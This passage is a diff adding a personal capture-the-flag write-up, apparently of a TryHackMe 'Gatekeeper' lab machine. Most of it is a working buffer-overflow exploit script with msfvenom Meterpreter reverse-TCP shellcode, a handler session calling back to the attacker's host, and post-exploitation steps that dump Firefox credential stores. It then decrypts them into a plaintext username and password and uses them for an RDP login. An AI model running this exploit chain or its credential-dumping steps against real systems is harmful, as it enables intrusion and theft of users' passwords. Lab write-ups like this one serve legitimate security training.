@@ -613,3 +613,619 @@ Generating Meterpreter shellcode using the following flags:
 [-] No arch selected, selecting arch: x86 from the payload
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 381 (iteration=0)
+x86/shikata_ga_nai chosen with final size 381
+Payload size: 381 bytes
+Final size of python file: 2064 bytes
+payload =  b""
+payload += b"\xba\x3b\x9f\xe4\xe2\xda\xc0\xd9\x74\x24\xf4"
+payload += b"\x5f\x29\xc9\xb1\x59\x31\x57\x14\x03\x57\x14"
+payload += b"\x83\xc7\x04\xd9\x6a\x18\x0a\x92\x95\xe1\xcb"
+payload += b"\xcc\xa4\x33\xaf\x87\x95\x83\xbb\xc5\x15\x6f"
+payload += b"\xe9\xfd\xac\x8a\x85\x8f\x86\x5b\x2d\x25\xf1"
+payload += b"\x52\xae\x88\x3d\x38\x6c\x8b\xc1\x43\xa1\x6b"
+payload += b"\xfb\x8b\xb4\x6a\x3c\x5a\xb2\x83\x90\xd6\x6e"
+payload += b"\x4b\x9e\xab\xb2\x3c\xa1\xfb\x40\x82\xd9\x7e"
+payload += b"\x96\x76\x56\x80\xc7\xfd\x3e\xa2\xb7\x8a\xf7"
+payload += b"\xba\x36\x5f\x82\x72\x4c\x63\xbc\x7b\xe4\x10"
+payload += b"\x8a\x08\xf6\xf0\xc2\xce\x55\x3d\xeb\xc2\xa4"
+payload += b"\x7a\xcc\x3c\xd3\x70\x2e\xc0\xe4\x43\x4c\x1e"
+payload += b"\x60\x53\xf6\xd5\xd2\xb7\x06\x39\x84\x3c\x04"
+payload += b"\xf6\xc2\x1a\x09\x09\x06\x11\x35\x82\xa9\xf5"
+payload += b"\xbf\xd0\x8d\xd1\xe4\x83\xac\x40\x41\x65\xd0"
+payload += b"\x92\x2d\xda\x74\xd9\xdc\x0d\x08\x22\x1f\x32"
+payload += b"\x54\xb4\xd3\xff\x67\x44\x7c\x77\x1b\x76\x23"
+payload += b"\x23\xb3\x3a\xac\xed\x44\x4b\xba\x0d\x9a\xf3"
+payload += b"\xab\xf3\x1b\x03\xe5\x37\x4f\x53\x9d\x9e\xf0"
+payload += b"\x38\x5d\x1e\x25\xd4\x57\x88\xcc\x23\x39\x94"
+payload += b"\xb9\x31\xb9\x21\x03\xbc\x5f\x79\x23\xee\xcf"
+payload += b"\x3a\x93\x4e\xa0\xd2\xf9\x41\x9f\xc3\x01\x88"
+payload += b"\x88\x6e\xee\x64\xe0\x06\x97\x2d\x7a\xb6\x58"
+payload += b"\xf8\x06\xf8\xd3\x08\xf6\xb7\x13\x79\xe4\xa0"
+payload += b"\x43\x81\xf4\x30\xe6\x81\x9e\x34\xa0\xd6\x36"
+payload += b"\x37\x95\x10\x99\xc8\xf0\x23\xde\x37\x85\x15"
+payload += b"\x94\x0e\x13\x19\xc2\x6e\xf3\x99\x12\x39\x99"
+payload += b"\x99\x7a\x9d\xf9\xca\x9f\xe2\xd7\x7f\x0c\x77"
+payload += b"\xd8\x29\xe0\xd0\xb0\xd7\xdf\x17\x1f\x28\x0a"
+payload += b"\x24\x58\xd6\xc8\x03\xc1\xbe\x32\x14\xf1\x3e"
+payload += b"\x59\x94\xa1\x56\x96\xbb\x4e\x96\x57\x16\x07"
+payload += b"\xbe\xd2\xf7\xe5\x5f\xe2\xdd\xa8\xc1\xe3\xd2"
+payload += b"\x70\xf2\x9e\x9b\x87\xf3\x5e\xb2\xe3\xf4\x5e"
+payload += b"\xba\x15\xc9\x88\x83\x63\x0c\x09\xb0\x7c\x3b"
+payload += b"\x2c\x91\x16\x43\x62\xe1\x32"
+
+remember the padding just to ge no errors
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
+└─$ cat exploit_msf.py 
+import socket
+
+ip = "10.10.118.64"
+port = 31337
+
+#prefix = ""
+offset = 146
+overflow = "A" * offset
+retn = "\xc3\x14\x04\x08"
+padding = "\x90" * 16
+payload =  b""
+payload += b"\xba\x3b\x9f\xe4\xe2\xda\xc0\xd9\x74\x24\xf4"
+payload += b"\x5f\x29\xc9\xb1\x59\x31\x57\x14\x03\x57\x14"
+payload += b"\x83\xc7\x04\xd9\x6a\x18\x0a\x92\x95\xe1\xcb"
+payload += b"\xcc\xa4\x33\xaf\x87\x95\x83\xbb\xc5\x15\x6f"
+payload += b"\xe9\xfd\xac\x8a\x85\x8f\x86\x5b\x2d\x25\xf1"
+payload += b"\x52\xae\x88\x3d\x38\x6c\x8b\xc1\x43\xa1\x6b"
+payload += b"\xfb\x8b\xb4\x6a\x3c\x5a\xb2\x83\x90\xd6\x6e"
+payload += b"\x4b\x9e\xab\xb2\x3c\xa1\xfb\x40\x82\xd9\x7e"
+payload += b"\x96\x76\x56\x80\xc7\xfd\x3e\xa2\xb7\x8a\xf7"
+payload += b"\xba\x36\x5f\x82\x72\x4c\x63\xbc\x7b\xe4\x10"
+payload += b"\x8a\x08\xf6\xf0\xc2\xce\x55\x3d\xeb\xc2\xa4"
+payload += b"\x7a\xcc\x3c\xd3\x70\x2e\xc0\xe4\x43\x4c\x1e"
+payload += b"\x60\x53\xf6\xd5\xd2\xb7\x06\x39\x84\x3c\x04"
+payload += b"\xf6\xc2\x1a\x09\x09\x06\x11\x35\x82\xa9\xf5"
+payload += b"\xbf\xd0\x8d\xd1\xe4\x83\xac\x40\x41\x65\xd0"
+payload += b"\x92\x2d\xda\x74\xd9\xdc\x0d\x08\x22\x1f\x32"
+payload += b"\x54\xb4\xd3\xff\x67\x44\x7c\x77\x1b\x76\x23"
+payload += b"\x23\xb3\x3a\xac\xed\x44\x4b\xba\x0d\x9a\xf3"
+payload += b"\xab\xf3\x1b\x03\xe5\x37\x4f\x53\x9d\x9e\xf0"
+payload += b"\x38\x5d\x1e\x25\xd4\x57\x88\xcc\x23\x39\x94"
+payload += b"\xb9\x31\xb9\x21\x03\xbc\x5f\x79\x23\xee\xcf"
+payload += b"\x3a\x93\x4e\xa0\xd2\xf9\x41\x9f\xc3\x01\x88"
+payload += b"\x88\x6e\xee\x64\xe0\x06\x97\x2d\x7a\xb6\x58"
+payload += b"\xf8\x06\xf8\xd3\x08\xf6\xb7\x13\x79\xe4\xa0"
+payload += b"\x43\x81\xf4\x30\xe6\x81\x9e\x34\xa0\xd6\x36"
+payload += b"\x37\x95\x10\x99\xc8\xf0\x23\xde\x37\x85\x15"
+payload += b"\x94\x0e\x13\x19\xc2\x6e\xf3\x99\x12\x39\x99"
+payload += b"\x99\x7a\x9d\xf9\xca\x9f\xe2\xd7\x7f\x0c\x77"
+payload += b"\xd8\x29\xe0\xd0\xb0\xd7\xdf\x17\x1f\x28\x0a"
+payload += b"\x24\x58\xd6\xc8\x03\xc1\xbe\x32\x14\xf1\x3e"
+payload += b"\x59\x94\xa1\x56\x96\xbb\x4e\x96\x57\x16\x07"
+payload += b"\xbe\xd2\xf7\xe5\x5f\xe2\xdd\xa8\xc1\xe3\xd2"
+payload += b"\x70\xf2\x9e\x9b\x87\xf3\x5e\xb2\xe3\xf4\x5e"
+payload += b"\xba\x15\xc9\x88\x83\x63\x0c\x09\xb0\x7c\x3b"
+payload += b"\x2c\x91\x16\x43\x62\xe1\x32"
+postfix = ""
+
+buffer = overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+----
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
+└─$ cat exploit_msf.py 
+import socket
+
+ip = "10.10.118.64"
+port = 31337
+
+#prefix = ""
+offset = 146
+overflow = "A" * offset
+retn = "\xc3\x14\x04\x08"
+padding = "\x90" * 16
+payload =  ("\xba\x3b\x9f\xe4\xe2\xda\xc0\xd9\x74\x24\xf4"
+"\x5f\x29\xc9\xb1\x59\x31\x57\x14\x03\x57\x14"
+"\x83\xc7\x04\xd9\x6a\x18\x0a\x92\x95\xe1\xcb"
+"\xcc\xa4\x33\xaf\x87\x95\x83\xbb\xc5\x15\x6f"
+"\xe9\xfd\xac\x8a\x85\x8f\x86\x5b\x2d\x25\xf1"
+"\x52\xae\x88\x3d\x38\x6c\x8b\xc1\x43\xa1\x6b"
+"\xfb\x8b\xb4\x6a\x3c\x5a\xb2\x83\x90\xd6\x6e"
+"\x4b\x9e\xab\xb2\x3c\xa1\xfb\x40\x82\xd9\x7e"
+"\x96\x76\x56\x80\xc7\xfd\x3e\xa2\xb7\x8a\xf7"
+"\xba\x36\x5f\x82\x72\x4c\x63\xbc\x7b\xe4\x10"
+"\x8a\x08\xf6\xf0\xc2\xce\x55\x3d\xeb\xc2\xa4"
+"\x7a\xcc\x3c\xd3\x70\x2e\xc0\xe4\x43\x4c\x1e"
+"\x60\x53\xf6\xd5\xd2\xb7\x06\x39\x84\x3c\x04"
+"\xf6\xc2\x1a\x09\x09\x06\x11\x35\x82\xa9\xf5"
+"\xbf\xd0\x8d\xd1\xe4\x83\xac\x40\x41\x65\xd0"
+"\x92\x2d\xda\x74\xd9\xdc\x0d\x08\x22\x1f\x32"
+"\x54\xb4\xd3\xff\x67\x44\x7c\x77\x1b\x76\x23"
+"\x23\xb3\x3a\xac\xed\x44\x4b\xba\x0d\x9a\xf3"
+"\xab\xf3\x1b\x03\xe5\x37\x4f\x53\x9d\x9e\xf0"
+"\x38\x5d\x1e\x25\xd4\x57\x88\xcc\x23\x39\x94"
+"\xb9\x31\xb9\x21\x03\xbc\x5f\x79\x23\xee\xcf"
+"\x3a\x93\x4e\xa0\xd2\xf9\x41\x9f\xc3\x01\x88"
+"\x88\x6e\xee\x64\xe0\x06\x97\x2d\x7a\xb6\x58"
+"\xf8\x06\xf8\xd3\x08\xf6\xb7\x13\x79\xe4\xa0"
+"\x43\x81\xf4\x30\xe6\x81\x9e\x34\xa0\xd6\x36"
+"\x37\x95\x10\x99\xc8\xf0\x23\xde\x37\x85\x15"
+"\x94\x0e\x13\x19\xc2\x6e\xf3\x99\x12\x39\x99"
+"\x99\x7a\x9d\xf9\xca\x9f\xe2\xd7\x7f\x0c\x77"
+"\xd8\x29\xe0\xd0\xb0\xd7\xdf\x17\x1f\x28\x0a"
+"\x24\x58\xd6\xc8\x03\xc1\xbe\x32\x14\xf1\x3e"
+"\x59\x94\xa1\x56\x96\xbb\x4e\x96\x57\x16\x07"
+"\xbe\xd2\xf7\xe5\x5f\xe2\xdd\xa8\xc1\xe3\xd2"
+"\x70\xf2\x9e\x9b\x87\xf3\x5e\xb2\xe3\xf4\x5e"
+"\xba\x15\xc9\x88\x83\x63\x0c\x09\xb0\x7c\x3b"
+"\x2c\x91\x16\x43\x62\xe1\x32")
+postfix = ""
+buffer = overflow + retn + padding + payload + postfix 
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+----
+
+not work so create again msfvenom
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.220 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 402 (iteration=0)
+x86/shikata_ga_nai chosen with final size 402
+Payload size: 402 bytes
+Final size of c file: 1719 bytes
+unsigned char buf[] = 
+"\xbd\x2d\xb5\x15\xfb\xdd\xc6\xd9\x74\x24\xf4\x58\x29\xc9"
+"\xb1\x5e\x31\x68\x15\x83\xc0\x04\x03\x68\x11\xe2\xd8\x49"
+"\xfd\x74\x22\xb2\xfe\xea\xab\x57\xcf\x38\xcf\x1c\x62\x8d"
+"\x84\x71\x8f\x66\xc8\x61\x80\xcf\xa6\xaf\x15\x5d\x1e\x81"
+"\xd6\x93\x9e\x4d\x14\xb5\x62\x8c\x49\x15\x5b\x5f\x9c\x54"
+"\x9c\x29\xea\xb9\x70\x21\x46\x56\x23\xbe\x25\x6a\xca\x10"
+"\x22\xd2\xb4\x15\xf5\xa7\x08\x17\x26\xcc\xd8\x0f\x4d\x8b"
+"\xf8\x7f\x50\xff\x7d\xb6\x26\xc3\x4c\xb6\x8e\xb0\x9a\xc3"
+"\x10\x11\xd3\x13\xd3\x52\x1e\x38\xd5\xab\x18\xa0\xa3\xc7"
+"\x5b\x5d\xb4\x13\x26\xb9\x31\x84\x80\x4a\xe1\x60\x31\x9e"
+"\x74\xe2\x3d\x6b\xf2\xac\x21\x6a\xd7\xc6\x5d\xe7\xd6\x08"
+"\xd4\xb3\xfc\x8c\xbd\x60\x9c\x95\x1b\xc6\xa1\xc6\xc3\xb7"
+"\x07\x8c\xe1\xae\x38\x6d\xfa\xce\x64\xfa\x37\x03\x97\xfa"
+"\x5f\x14\xe4\xc8\xc0\x8e\x62\x61\x89\x08\x74\xf0\x9d\xaa"
+"\xaa\xba\xcd\x54\x4b\xbb\xc4\x92\x1f\xeb\x7e\x32\x20\x60"
+"\x7e\xbb\xf5\x1d\x74\x2b\xfc\xea\xd9\x77\x68\xef\xd9\x96"
+"\x35\x66\x3f\xc8\x95\x28\xef\xa9\x45\x89\x5f\x42\x8c\x06"
+"\x80\x72\xaf\xcc\xa9\x19\x40\xb9\x82\xb5\xf9\xe0\x58\x27"
+"\x05\x3f\x25\x67\x8d\xca\xda\x26\x66\xbe\xc8\x5f\x11\x40"
+"\x10\xa0\xb4\x40\x7a\xa4\x1e\x16\x12\xa6\x47\x50\xbd\x59"
+"\xa2\xe2\xb9\xa6\x33\xd3\xb2\x91\xa1\x5b\xac\xdd\x25\x5c"
+"\x2c\x88\x2f\x5c\x44\x6c\x14\x0f\x71\x73\x81\x23\x2a\xe6"
+"\x2a\x12\x9f\xa1\x42\x98\xc6\x86\xcc\x63\x2d\x95\x0b\x9b"
+"\xb0\xb2\xb3\xf4\x4a\x83\x43\x05\x20\x03\x14\x6d\xbf\x2c"
+"\x9b\x5d\x40\xe7\xf4\xf5\xcb\x66\xb6\x64\xcc\xa2\x16\x39"
+"\xcd\x41\x83\xca\xb4\x2a\x34\x2b\x49\x23\x51\x2b\x4a\x4b"
+"\x67\x17\x9d\x72\x1d\x56\x1e\xc1\x3e\x45\x8a\x3c\xd7\xd0"
+"\x5f\xfd\xba\xe2\x8a\xc2\xc2\x60\x3e\xbb\x30\x78\x4b\xbe"
+"\x7d\x3e\xa0\xb2\xee\xab\xc6\x61\x0e\xfe";
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
+└─$ nano exploit_msf.py
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
+└─$ python exploit_msf.py 
+Sending evil buffer...
+Done!
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
+└─$ cat exploit_msf.py
+import socket
+
+ip = "10.10.118.64"
+port = 31337
+
+#prefix = ""
+offset = 146
+overflow = "A" * offset
+retn = "\xc3\x14\x04\x08"
+padding = "\x90" * 16
+payload =  ("\xbd\x2d\xb5\x15\xfb\xdd\xc6\xd9\x74\x24\xf4\x58\x29\xc9"
+"\xb1\x5e\x31\x68\x15\x83\xc0\x04\x03\x68\x11\xe2\xd8\x49"
+"\xfd\x74\x22\xb2\xfe\xea\xab\x57\xcf\x38\xcf\x1c\x62\x8d"
+"\x84\x71\x8f\x66\xc8\x61\x80\xcf\xa6\xaf\x15\x5d\x1e\x81"
+"\xd6\x93\x9e\x4d\x14\xb5\x62\x8c\x49\x15\x5b\x5f\x9c\x54"
+"\x9c\x29\xea\xb9\x70\x21\x46\x56\x23\xbe\x25\x6a\xca\x10"
+"\x22\xd2\xb4\x15\xf5\xa7\x08\x17\x26\xcc\xd8\x0f\x4d\x8b"
+"\xf8\x7f\x50\xff\x7d\xb6\x26\xc3\x4c\xb6\x8e\xb0\x9a\xc3"
+"\x10\x11\xd3\x13\xd3\x52\x1e\x38\xd5\xab\x18\xa0\xa3\xc7"
+"\x5b\x5d\xb4\x13\x26\xb9\x31\x84\x80\x4a\xe1\x60\x31\x9e"
+"\x74\xe2\x3d\x6b\xf2\xac\x21\x6a\xd7\xc6\x5d\xe7\xd6\x08"
+"\xd4\xb3\xfc\x8c\xbd\x60\x9c\x95\x1b\xc6\xa1\xc6\xc3\xb7"
+"\x07\x8c\xe1\xae\x38\x6d\xfa\xce\x64\xfa\x37\x03\x97\xfa"
+"\x5f\x14\xe4\xc8\xc0\x8e\x62\x61\x89\x08\x74\xf0\x9d\xaa"
+"\xaa\xba\xcd\x54\x4b\xbb\xc4\x92\x1f\xeb\x7e\x32\x20\x60"
+"\x7e\xbb\xf5\x1d\x74\x2b\xfc\xea\xd9\x77\x68\xef\xd9\x96"
+"\x35\x66\x3f\xc8\x95\x28\xef\xa9\x45\x89\x5f\x42\x8c\x06"
+"\x80\x72\xaf\xcc\xa9\x19\x40\xb9\x82\xb5\xf9\xe0\x58\x27"
+"\x05\x3f\x25\x67\x8d\xca\xda\x26\x66\xbe\xc8\x5f\x11\x40"
+"\x10\xa0\xb4\x40\x7a\xa4\x1e\x16\x12\xa6\x47\x50\xbd\x59"
+"\xa2\xe2\xb9\xa6\x33\xd3\xb2\x91\xa1\x5b\xac\xdd\x25\x5c"
+"\x2c\x88\x2f\x5c\x44\x6c\x14\x0f\x71\x73\x81\x23\x2a\xe6"
+"\x2a\x12\x9f\xa1\x42\x98\xc6\x86\xcc\x63\x2d\x95\x0b\x9b"
+"\xb0\xb2\xb3\xf4\x4a\x83\x43\x05\x20\x03\x14\x6d\xbf\x2c"
+"\x9b\x5d\x40\xe7\xf4\xf5\xcb\x66\xb6\x64\xcc\xa2\x16\x39"
+"\xcd\x41\x83\xca\xb4\x2a\x34\x2b\x49\x23\x51\x2b\x4a\x4b"
+"\x67\x17\x9d\x72\x1d\x56\x1e\xc1\x3e\x45\x8a\x3c\xd7\xd0"
+"\x5f\xfd\xba\xe2\x8a\xc2\xc2\x60\x3e\xbb\x30\x78\x4b\xbe"
+"\x7d\x3e\xa0\xb2\xee\xab\xc6\x61\x0e\xfe")
+postfix = ""
+buffer = overflow + retn + padding + payload + postfix 
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+
+yep was prolly a problem with the port 1337 so I change port 4444
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
+└─$ msfconsole -q
+```
+```text
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+```
+```text
+msf6 exploit(multi/handler) > set lhost 10.11.81.220
+lhost => 10.11.81.220
+```
+```text
+msf6 exploit(multi/handler) > set lport 1337
+lport => 1337
+```
+```text
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.11.81.220:1337 
+^C[-] Exploit failed [user-interrupt]: Interrupt 
+[-] exploit: Interrupted
+```
+```text
+msf6 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh
+                                        , thread, process, none)
+   LHOST     10.11.81.220     yes       The listen address (an interface
+                                        may be specified)
+   LPORT     1337             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+```
+```text
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+```
+```text
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.11.81.220:4444 
+[*] Sending stage (175686 bytes) to 10.10.118.64
+[*] Meterpreter session 1 opened (10.11.81.220:4444 -> 10.10.118.64:49215) at 2022-09-30 14:27:13 -0400
+```
+```text
+meterpreter > sysinfo
+Computer        : GATEKEEPER
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+```
+```text
+meterpreter > ls
+Listing: C:\Users\natbat\Desktop
+================================
+
+Mode            Size   Type  Last modified            Name
+----            ----   ----  -------------            ----
+100666/rw-rw-r  1197   fil   2020-04-21 17:00:33 -04  Firefox.lnk
+w-                           00
+100666/rw-rw-r  282    fil   2020-04-21 16:57:09 -04  desktop.ini
+w-                           00
+100777/rwxrwxr  13312  fil   2020-04-20 01:27:17 -04  gatekeeper.exe
+wx                           00
+100777/rwxrwxr  135    fil   2020-04-21 21:53:23 -04  gatekeeperstart.bat
+wx                           00
+100666/rw-rw-r  140    fil   2020-05-14 21:43:14 -04  user.txt.txt
+w-                           00
+```
+```text
+meterpreter > cat user.txt.txt
+{H4lf_W4y_Th3r3}
+
+The buffer overflow in this room is credited to Justin Steven and his 
+"dostackbufferoverflowgood" program.  Thank you!meterpreter > 
+
+now the party will be start now privilege escalation time
+
+when i run ls command in back screen i found Firefox.lnk
+
+Firefox.lnk this is shortcut icon thats meaning this machine have firefox browser
+
+why not try dump the credential lets try
+
+ok now press ctrl+z in meterpreter shell and choose yes kept it in background
+
+and now use the post/multi/gather/firefox_creds to dump the users credential
+
+use post/multi/gather/firefox_creds
+```
+```text
+meterpreter > 
+Background session 1? [y/N]  y
+[-] Unknown command: y
+```
+```text
+msf6 exploit(multi/handler) > use post/multi/gather/firefox_creds
+```
+```text
+msf6 post(multi/gather/firefox_creds) > options
+
+Module options (post/multi/gather/firefox_creds):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   DECRYPT  false            no        Decrypts passwords without third p
+                                       arty tools
+   SESSION                   yes       The session to run this module on
+```
+```text
+msf6 post(multi/gather/firefox_creds) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                 Information          Connection
+  --  ----  ----                 -----------          ----------
+  1         meterpreter x86/win  GATEKEEPER\natbat @  10.11.81.220:4444 -
+            dows                  GATEKEEPER          > 10.10.118.64:4921
+                                                      5 (10.10.118.64)
+```
+```text
+msf6 post(multi/gather/firefox_creds) > set session 1
+session => 1
+```
+```text
+msf6 post(multi/gather/firefox_creds) > run
+
+[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?
+[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\
+
+[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+[+] Downloaded cert9.db: /home/kali/.msf4/loot/20220930143441_default_10.10.118.64_ff.ljfn812a.cert_019696.bin
+[+] Downloaded cookies.sqlite: /home/kali/.msf4/loot/20220930143448_default_10.10.118.64_ff.ljfn812a.cook_754563.bin
+[+] Downloaded key4.db: /home/kali/.msf4/loot/20220930143453_default_10.10.118.64_ff.ljfn812a.key4_906255.bin
+[+] Downloaded logins.json: /home/kali/.msf4/loot/20220930143457_default_10.10.118.64_ff.ljfn812a.logi_051444.bin
+
+[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default
+
+[*] Post module execution completed
+
+now it dump the info in this path /home/kali/.msf4/loot/
+
+show in your terminal whats the path
+
+now i try to decrypt the info by this tool
+
+https://github.com/unode/firefox_decrypt
+
+we should change the filse name to cert9.db,cookies.sqlite,login.json and key4.db
+
+ok now i will rename all files
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
+└─$ ls
+badchar.py  exploit_msf.py  exploit.py  gatekeeper.exe
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/gatekeeper]
+└─$ cd /home/kali/.msf4/loot/
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ ls
+20220819200040_default_10.10.106.201_mysql_schema_117039.txt
+20220824141321_default_10.10.89.18_linux.passwd_244906.txt
+20220824141321_default_10.10.89.18_linux.shadow_939492.txt
+20220824141322_default_10.10.89.18_linux.hashes_824448.txt
+20220824141322_default_10.10.89.18_linux.passwd.his_659025.txt
+20220930143441_default_10.10.118.64_ff.ljfn812a.cert_019696.bin
+20220930143448_default_10.10.118.64_ff.ljfn812a.cook_754563.bin
+20220930143453_default_10.10.118.64_ff.ljfn812a.key4_906255.bin
+20220930143457_default_10.10.118.64_ff.ljfn812a.logi_051444.bin
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ mv 20220930143441_default_10.10.118.64_ff.ljfn812a.cert_019696.bin cert9.db
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ mv 20220930143448_default_10.10.118.64_ff.ljfn812a.cook_754563.bin cookies.sqlite
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ mv 20220930143453_default_10.10.118.64_ff.ljfn812a.key4_906255.bin key4.db
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ mv 20220930143457_default_10.10.118.64_ff.ljfn812a.logi_051444.bin logins.json
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ git clone https://github.com/unode/firefox_decrypt.git
+Cloning into 'firefox_decrypt'...
+remote: Enumerating objects: 1152, done.
+remote: Counting objects: 100% (264/264), done.
+remote: Compressing objects: 100% (31/31), done.
+remote: Total 1152 (delta 246), reused 235 (delta 233), pack-reused 888
+Receiving objects: 100% (1152/1152), 411.61 KiB | 1.29 MiB/s, done.
+Resolving deltas: 100% (728/728), done.
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ ls
+20220819200040_default_10.10.106.201_mysql_schema_117039.txt
+20220824141321_default_10.10.89.18_linux.passwd_244906.txt
+20220824141321_default_10.10.89.18_linux.shadow_939492.txt
+20220824141322_default_10.10.89.18_linux.hashes_824448.txt
+20220824141322_default_10.10.89.18_linux.passwd.his_659025.txt
+cert9.db
+cookies.sqlite
+firefox_decrypt
+key4.db
+logins.json
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ cd firefox_decrypt
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot/firefox_decrypt]
+└─$ ls
+AUTHORS  CHANGELOG.md  firefox_decrypt.py  LICENSE  README.md  tests
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot/firefox_decrypt]
+└─$ pwd                     
+/home/kali/.msf4/loot/firefox_decrypt
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot/firefox_decrypt]
+└─$ cp firefox_decrypt.py /home/kali/.msf4/loot/
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot/firefox_decrypt]
+└─$ cd ..
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ ls
+20220819200040_default_10.10.106.201_mysql_schema_117039.txt
+20220824141321_default_10.10.89.18_linux.passwd_244906.txt
+20220824141321_default_10.10.89.18_linux.shadow_939492.txt
+20220824141322_default_10.10.89.18_linux.hashes_824448.txt
+20220824141322_default_10.10.89.18_linux.passwd.his_659025.txt
+cert9.db
+cookies.sqlite
+firefox_decrypt
+firefox_decrypt.py
+key4.db
+logins.json
+
+now i will run the tool by this command
+
+python3 firefox_decrypt.py ./
+```
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ python3 firefox_decrypt.py ./                                  
+2022-09-30 14:44:17,187 - WARNING - profile.ini not found in ./
+2022-09-30 14:44:17,188 - WARNING - Continuing and assuming './' is a profile location
+
+Website:   https://creds.com
+Username: 'mayor'
+Password: '8CL7O1N78MdrCIsV'
+
+now use a remote desktop
+
+exit to msfconsole to get response
+```
+```text
+msf6 post(multi/gather/firefox_creds) > exit
+[*] You have active sessions open, to exit anyway type "exit -y"
+```
+```text
+msf6 post(multi/gather/firefox_creds) > Interrupt: use the 'exit' command to quit
+```
+```text
+msf6 post(multi/gather/firefox_creds) > 
+zsh: suspended  msfconsole -q
+```
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[~/.msf4/loot]
+└─$ xfreerdp /u:'mayor' /p:'8CL7O1N78MdrCIsV' /v:10.10.118.64 /size:85%
+
+the root.txt is in Desktop :)
+
+{Th3_M4y0r_C0ngr4tul4t3s_U}
+
+so the machine is pwned
+```
+![[Pasted image 20220929231225.png]]
+![[Pasted image 20220930102627.png]]
+![[Pasted image 20220930102814.png]]
+![[Pasted image 20220930103225.png]]
+![[Pasted image 20220930104400.png]]
+![[Pasted image 20220930104526.png]]
+![[Pasted image 20220930111419.png]]
+![[Pasted image 20220930113931.png]]
+![[Pasted image 20220930122810.png]]
+![](https://miro.medium.com/max/720/1*F7wXSDRZKJkrJPu7jzc_sA.png)
+![[Pasted image 20220930134720.png]]
+Locate and find the User Flag.
+*{H4lf_W4y_Th3r3}*
+Locate and find the Root Flag
+*{Th3_M4y0r_C0ngr4tul4t3s_U}*
+
+## Notes / Lessons Learned
+[[Brainstorm]]
+
